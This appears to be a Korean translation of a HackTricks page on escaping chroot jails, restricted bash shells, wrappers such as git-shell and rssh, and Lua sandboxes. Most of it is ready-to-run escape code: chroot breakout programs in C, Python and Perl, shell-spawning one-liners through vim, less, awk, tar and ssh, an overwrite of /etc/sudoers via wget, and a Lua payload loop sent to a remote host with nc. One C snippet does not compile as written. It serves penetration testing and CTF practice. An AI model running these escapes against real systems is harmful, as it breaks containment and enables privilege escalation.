# Jail 탈출

{{#include ../../banners/hacktricks-training.md}}

## **GTFOBins**

**[**https://gtfobins.github.io/**](https://gtfobins.github.io)에서 "Shell" property를 사용해 어떤 binary든 execute할 수 있는지 **검색하세요**

## Chroot 탈출

[wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations)에 따르면: chroot mechanism은 **privileged** (**root**) **users**의 의도적인 변조를 **방어하도록 설계되지 않았습니다**. 대부분의 system에서 chroot contexts는 제대로 stack되지 않으며, **충분한 privileges가 있는 chrooted programs는 두 번째 chroot를 수행하여 탈출할 수 있습니다**.\
일반적으로 이는 탈출하려면 chroot 내부에서 root여야 한다는 의미입니다.

> [!TIP]
> 다음 **tool** [**chw00t**](https://github.com/earthquake/chw00t)은 다음 scenarios를 악용하고 `chroot`에서 탈출하기 위해 제작되었습니다.

### Root + CWD

> [!WARNING]
> chroot 내부에서 **root**라면 **또 다른 chroot를 생성하여 탈출할 수 있습니다**. Linux에서는 두 개의 chroot가 공존할 수 없기 때문입니다. 따라서 folder를 생성한 다음, **새로운 chroot를 생성**하고 그 새로운 folder에서 **자신이 그 바깥에 있는 상태**라면, 이제 **새로운 chroot의 바깥에 있게 되며** 결과적으로 FS에 있게 됩니다.
>
> 이는 일반적으로 chroot가 working directory를 지정된 위치로 이동시키지 않기 때문에 발생합니다. 따라서 chroot를 생성하더라도 그 바깥에 있을 수 있습니다.

일반적으로 chroot jail 내부에서는 `chroot` binary를 찾을 수 없지만, 다음과 같이 binary를 **compile하고 upload한 뒤 execute할 수 있습니다**:

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("chroot-dir", 0755);
chroot("chroot-dir");
for(int i = 0; i < 1000; i++) {
chdir("..");
}
chroot(".");
system("/bin/bash");
}
```
</details>

<details>

<summary>Python</summary>
```python
#!/usr/bin/python
import os
os.mkdir("chroot-dir")
os.chroot("chroot-dir")
for i in range(1000):
os.chdir("..")
os.chroot(".")
os.system("/bin/bash")
```
</details>

<details>

<summary>Perl</summary>
```perl
#!/usr/bin/perl
mkdir "chroot-dir";
chroot "chroot-dir";
foreach my $i (0..1000) {
chdir ".."
}
chroot ".";
system("/bin/bash");
```
</details>

### Root + Saved fd

> [!WARNING]
> 이는 이전 사례와 유사하지만, 이 경우 **attacker는 현재 디렉터리에 대한 file descriptor를 저장한 후** **새 폴더에 chroot를 생성**합니다. 마지막으로 **chroot 외부에서** 해당 **FD에 대한 access 권한**을 가지고 있으므로, 해당 FD에 access하여 **escape합니다**.

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("tmpdir", 0755);
dir_fd = open(".", O_RDONLY);
if(chroot("tmpdir")){
perror("chroot");
}
fchdir(dir_fd);
close(dir_fd);
for(x = 0; x < 1000; x++) chdir("..");
chroot(".");
}
```
</details>

### Root + Fork + UDS (Unix Domain Sockets)

> [!WARNING]
> FD can be passed over Unix Domain Sockets, so:
>
> - Create a child process (fork)
> - Create UDS so parent and child can talk
> - Run chroot in child process in a different folder
> - In parent proc, create a FD of a folder that is outside of new child proc chroot
> - Pass to child procc that FD using the UDS
> - Child process chdir to that FD, and because it's ouside of its chroot, he will escape the jail

### Root + Mount

> [!WARNING]
>
> - Mounting root device (/) into a directory inside the chroot
> - Chrooting into that directory
>
> This is possible in Linux

### Root + /proc

> [!WARNING]
>
> - Mount procfs into a directory inside the chroot (if it isn't yet)
> - Look for a pid that has a different root/cwd entry, like: /proc/1/root
> - Chroot into that entry

### Root(?) + Fork

> [!WARNING]
>
> - Create a Fork (child proc) and chroot into a different folder deeper in the FS and CD on it
> - From the parent process, move the folder where the child process is in a folder previous to the chroot of the children
> - This children process will find himself outside of the chroot

### ptrace

> [!WARNING]
>
> - 과거에는 사용자가 자신이 생성한 프로세스에서 자신의 프로세스를 debug할 수 있었지만, 이제는 기본적으로 불가능함
> - 그래도 가능하다면, 프로세스에 ptrace하여 내부에서 shellcode를 실행할 수 있음 ([see this example](../interesting-files-permissions/linux-capabilities.md#cap_sys_ptrace)).

## Bash Jails

### Enumeration

Jail에 대한 정보를 가져옵니다:
```bash
echo $0
echo $SHELL
echo $PATH
env
export
pwd
set -o
compgen -c | sort -u
enable -a
type -a bash sh rbash ssh vi vim less more man awk find tar zip git scp script 2>/dev/null
```
### PATH 수정

PATH 환경 변수를 수정할 수 있는지 확인하세요
```bash
echo $PATH #See the path of the executables that you can use
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
echo /home/* #List directory
```
### vim 사용하기
```bash
:set shell=/bin/sh
:shell
```
### Pagers 및 help viewers

많은 제한된 환경에서는 여전히 **pagers** 또는 **help viewers**를 사용할 수 있습니다. 일반적으로 `PATH`를 다시 구성하려는 것보다 이를 악용하는 편이 더 빠릅니다.
```bash
less /etc/hosts
!/bin/sh

man man
!/bin/sh

man '-H/bin/sh #' man
```
`git`을 사용할 수 있다면, 도움말 출력은 일반적으로 pager를 통해 표시된다는 점을 기억하세요:
```bash
PAGER='/bin/sh -c "exec sh 0<&1"' git -p help
# Or: git help config
# Then inside the pager: !/bin/sh
```
### 일반적인 GTFOBins one-liners

접근 가능한 바이너리를 파악했다면, 먼저 명백한 shell spawner를 테스트하세요:
```bash
awk 'BEGIN {system("/bin/sh")}'
find . -exec /bin/sh \; -quit
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
zip /tmp/zip.zip /etc/hosts -T --unzip-command='sh -c /bin/sh'
script /dev/null -c bash
ssh localhost /bin/sh
```
허용된 command를 자유롭게 실행하는 대신 **arguments만 inject**할 수 있다면 **GTFOArgs**도 확인하세요.

### script 생성

내용이 _/bin/bash_인 실행 가능한 파일을 생성할 수 있는지 확인하세요.
```bash
red /bin/bash
> w wx/path #Write /bin/bash in a writable and executable path
```
### SSH에서 bash 가져오기

ssh를 통해 접속하는 경우, 제한된 login shell 대신 서버에 **다른 프로그램**을 실행하도록 요청할 수 있습니다:
```bash
ssh -t user@<IP> bash # Get directly an interactive shell
ssh user@<IP> -t "/bin/sh"
ssh user@<IP> -t "bash --noprofile -i"
ssh user@<IP> -t "() { :; }; sh -i "
```
`ssh`가 로컬에서 허용된 몇 안 되는 바이너리 중 하나라면, 이를 **GTFOBin**으로 악용할 수도 있다는 점을 기억하세요:
```bash
ssh localhost /bin/sh
ssh -o PermitLocalCommand=yes -o LocalCommand=/bin/sh localhost
ssh -o ProxyCommand=';/bin/sh 0<&2 1>&2' x
```
### Declare
```bash
declare -n PATH; export PATH=/bin;bash -i

BASH_CMDS[shell]=/bin/bash;shell -i
```
### Wget

예를 들어 sudoers 파일을 덮어쓸 수 있습니다.
```bash
wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
```
### Restricted shell wrappers (`git-shell`, `rssh`, `lshell`)

일부 환경에서는 일반적인 `rbash` 셸이 아니라 `git-shell`, `rssh`, `lshell`과 같은 **wrappers**로 진입하게 됩니다.

- `git-shell`은 서버 측 Git 명령과 `~/git-shell-commands/` 내부에 있는 항목만 허용합니다. 해당 디렉터리가 존재하면 `help`를 실행하여 허용된 사용자 지정 작업을 열거할 수 있습니다. 해당 위치에 **write** 권한이 있다면, 그 디렉터리에 추가한 모든 실행 파일에 접근할 수 있습니다.
- `rssh` / `lshell`은 일반적으로 `scp`, `sftp`, `rsync` 또는 Git 스타일 작업만 허용합니다. 이러한 경우 먼저 **file write primitives**에 집중하세요. `authorized_keys`, 셸 startup file 또는 helper script를 write 가능한 위치에 업로드한 다음 `ssh -t ...`로 다시 연결합니다.
- wrapper가 명령줄만 필터링하는 경우, 접근 가능한 바이너리를 열거한 다음 **GTFOBins / GTFOArgs**로 pivot하세요.

### Other tricks

다음 항목도 확인하세요.

- [**Fireshell Security - Restricted Linux Shell Escaping Techniques**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)
- [**SANS - Escaping Restricted Linux Shells**](https://www.sans.org/blog/escaping-restricted-linux-shells)
- [**GTFOBins**](https://gtfobins.org/)
- [**GTFOArgs**](https://gtfoargs.github.io/)

**다음 페이지도 흥미로울 수 있습니다.**

{{#ref}}
../linux-basics/bypass-linux-restrictions/
{{#endref}}

## Python Jails

Python jails에서 탈출하는 방법은 다음 페이지를 참고하세요.


{{#ref}}
../../generic-methodologies-and-resources/python/bypass-python-sandboxes/
{{#endref}}

## Lua Jails

이 페이지에서는 Lua 내부에서 접근할 수 있는 global functions를 확인할 수 있습니다: [https://www.gammon.com.au/scripts/doc.php?general=lua_base](https://www.gammon.com.au/scripts/doc.php?general=lua_base)

**Eval with command execution:**
```bash
load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
```
점 표기법을 사용하지 않고 **library의 함수를 호출하는** 몇 가지 tricks:
```bash
print(string.char(0x41, 0x42))
print(rawget(string, "char")(0x41, 0x42))
```
라이브러리의 함수 열거:
```bash
for k,v in pairs(string) do print(k,v) end
```
이전 one liner를 **서로 다른 Lua 환경에서 실행할 때마다 함수의 순서가 변경**된다는 점에 유의하세요. 따라서 특정 함수 하나를 실행해야 한다면, 서로 다른 Lua 환경을 로드하고 library의 첫 번째 함수를 호출하는 방식으로 brute force attack을 수행할 수 있습니다:
```bash
#In this scenario you could BF the victim that is generating a new lua environment
#for every interaction with the following line and when you are lucky
#the char function is going to be executed
for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end

#This attack from a CTF can be used to try to chain the function execute from "os" library
#and "char" from string library, and the use both to execute a command
for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
```
**대화형 lua shell 가져오기**: 제한된 lua shell 내부에 있다면 다음을 호출하여 새로운 lua shell(그리고 운이 좋다면 제한 없는 shell)을 얻을 수 있습니다:
```bash
debug.debug()
```
## 참고 자료

- [https://www.youtube.com/watch?v=UO618TeyCWo](https://www.youtube.com/watch?v=UO618TeyCWo) (슬라이드: [https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions\_-_Bucsay_Balazs.pdf](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf))
- [https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html](https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html)
- [https://git-scm.com/docs/git-shell](https://git-scm.com/docs/git-shell)

{{#include ../../banners/hacktricks-training.md}}
